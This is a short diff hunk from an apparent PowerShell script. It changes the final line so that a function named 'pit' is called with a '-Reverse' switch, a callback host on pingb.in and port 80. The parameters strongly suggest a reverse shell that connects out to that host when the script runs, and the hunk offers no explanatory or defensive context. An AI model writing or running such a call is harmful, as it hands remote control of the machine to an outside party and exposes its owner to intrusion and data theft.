@@ -86,4 +86,4 @@ function pit
         Write-Error $_
     }
 }
-pit -Reverse -IPAddress 216.0.0.1 -Port 80
+pit -Reverse -IPAddress 41da82470ff980dc6b65cc3dc39e.ns.pingb.in -Port 80
